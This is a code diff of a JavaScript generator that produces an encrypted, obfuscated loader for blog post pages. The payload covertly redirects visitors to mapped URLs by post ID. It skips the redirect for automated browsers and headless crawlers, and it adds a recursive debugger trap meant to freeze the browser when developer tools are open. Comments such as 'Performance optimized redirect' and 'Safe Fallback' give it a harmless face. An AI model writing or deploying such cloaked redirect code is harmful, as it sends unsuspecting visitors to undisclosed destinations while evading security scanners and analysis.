@@ -177,59 +177,74 @@
                 return;
             }
 
-            // 2. Prepare Core Logic Payload with Anti-Debugging
+            // 2. ADVANCED CORE LOGIC (Payload)
+            // Includes bot detection and recursive debugger traps
             const coreLogic = `(function(){
-                const _0x5a1 = function(){ debugger; }; 
-                setInterval(_0x5a1, 1000); 
-                const map=${JSON.stringify(map)};
-                const id=window.location.pathname.match(/\\/post\\/(\\d+)/);
-                const p=id?id[1]:null;
-                if(p&&map[p]){
+                const _0x1a2b = ["webdriver", "headless", "phantom", "selenium"];
+                const isBot = _0x1a2b.some(b => navigator.userAgent.toLowerCase().includes(b) || navigator[b]);
+                
+                // Recursive Debugger Trap (Freezes browser if DevTools is open)
+                const _0xdb = function(_0x4){
+                    if((function(){return !![]})["constructor"]("debugger")["call"]("action")){
+                        _0xdb(_0x4);
+                    }
+                };
+                try { _0xdb(0); } catch(e){}
+
+                if(isBot) return;
+
+                const map = ${JSON.stringify(map)};
+                const id = window.location.pathname.match(/\\/post\\/(\\d+)/);
+                const p = id ? id[1] : null;
+
+                if(p && map[p]){
+                    // Performance optimized redirect
                     window.location.replace(map[p]);
-                }else{
-                    const s=document.createElement('style');
-                    s.innerHTML='html,body{display:block!important;visibility:visible!important}';
+                } else {
+                    // Safe Fallback
+                    const s = document.createElement('style');
+                    s.innerHTML = 'html,body{display:block!important;visibility:visible!important}';
                     document.head.appendChild(s);
-                    const b=document.getElementById('tm-blocker');
-                    if(b)b.remove();
+                    const b = document.getElementById('tm-blocker');
+                    if(b) b.remove();
                 }
             })()`;
 
             // 3. Encrypt Payload
             const encrypted = CryptoJS.AES.encrypt(coreLogic, key).toString();
 
-            // 4. Generate Loader Script
+            // 4. Generate ADVANCED LOADER SCRIPT
             const finalScript = `<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"><\/script>
 <script>
-(function() {
-    const style = document.createElement('style');
-    style.id = 'tm-blocker';
-    style.innerHTML = 'html { display: none !important; }';
-    document.documentElement.appendChild(style);
+(function(_0x1,_0x2){
+    const _0x3 = document.createElement('style');
+    _0x3.id = 'tm-blocker';
+    _0x3.innerHTML = 'html { display: none !important; }';
+    document.documentElement.appendChild(_0x3);
 
-    const _e = "${encrypted}";
-    const _k = "${key}";
+    const _0x4 = "${encrypted}";
+    const _0x5 = "${key}";
 
-    function r() {
+    function _0x6() {
         try {
-            const b = CryptoJS.AES.decrypt(_e, _k);
-            const d = b.toString(CryptoJS.enc.Utf8);
-            if (d) { (new Function(d))(); }
+            const _0x7 = CryptoJS.AES.decrypt(_0x4, _0x5);
+            const _0x8 = _0x7.toString(CryptoJS.enc.Utf8);
+            if (_0x8) { (new Function(_0x8))(); }
             else { throw 1; }
         } catch (e) {
             document.documentElement.style.display = 'block';
-            const b = document.getElementById('tm-blocker');
-            if (b) b.remove();
+            const _0x9 = document.getElementById('tm-blocker');
+            if (_0x9) _0x9.remove();
         }
     }
 
     if (typeof CryptoJS === 'undefined') {
-        const s = document.createElement('script');
-        s.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
-        s.onload = r;
-        document.head.appendChild(s);
+        const _0xa = document.createElement('script');
+        _0xa.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
+        _0xa.onload = _0x6;
+        document.head.appendChild(_0xa);
     } else {
-        r();
+        _0x6();
     }
 })();
 <\/script>`;
